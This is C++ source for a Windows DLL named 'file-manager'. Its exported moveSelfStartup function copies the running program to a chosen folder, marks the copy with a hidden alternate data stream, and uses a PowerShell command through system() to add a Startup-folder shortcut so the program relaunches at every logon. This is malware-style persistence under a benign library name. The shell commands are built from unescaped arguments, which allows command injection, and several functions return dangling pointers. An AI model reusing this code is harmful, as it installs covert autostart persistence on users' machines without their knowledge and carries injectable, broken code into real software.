#include <windows.h>
#include <iostream>
#include <fstream>

//For username
#include <Lmcons.h>
//

//For selfName
#include <shlwapi.h>
//

//For selectFolder
#include <shlobj.h>
//

//Compiler command: g++.exe -shared -Wl,--output-def=bin\Release\libfile-manager.def -Wl,--out-implib=bin\Release\libfile-manager.a -Wl,--dll  obj\Release\main.o  -o bin\Release\file-manager.dll -s -static-libstdc++ -static-libgcc -static  -luser32 -lshlwapi -lole32

std::string gsfcp(const char* s) { return std::string(s); }

bool access_(std::string path) {
    std::ifstream file(path);
    if (!file.is_open()) {
        return false;
    }
    file.close();
    return true;
}

extern "C" const char* __cdecl getUName() {
    TCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    return std::string(username).c_str();
}

extern "C" const char* __cdecl getSelfName() {
    TCHAR filename[MAX_PATH];
    GetModuleFileName(NULL, filename, MAX_PATH);
    TCHAR *filename_only = PathFindFileName(filename);
    return std::string(filename_only).c_str();
}

extern "C" const char * __cdecl selectFolder(const char* description) {
    TCHAR szDir[MAX_PATH];

    BROWSEINFO bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.hwndOwner = NULL;
    bi.ulFlags = BIF_NEWDIALOGSTYLE | BIF_RETURNONLYFSDIRS;
    bi.lpszTitle = TEXT(description);
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);

    if (!pidl) { return "error"; }

    SHGetPathFromIDList(pidl, szDir);
    CoTaskMemFree(pidl);

    for (char& c : szDir) {
        if (c == '\\') {
            c = '/';
        }
    }

    std::string path = std::string(szDir);
    path += "/";
    return path.c_str();

}

extern "C" bool __cdecl access(const char* filePath) { return access_(gsfcp(filePath)); }
extern "C" bool __cdecl isStartup() { return (access_(std::string(getSelfName()) + ":startup")); }

extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {//Use a full path (From drive letter to filder with '/' at the end!)
    std::string self = getSelfName();
    std::string path = gsfcp(path_);
    std::string sName = gsfcp(sName_);
    if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
    std::string pStartup = "C:/Users/" + std::string(getUName()) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
    std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
    std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd;

    system(oneToRuleThemAll.c_str());

    return 0;
}
//
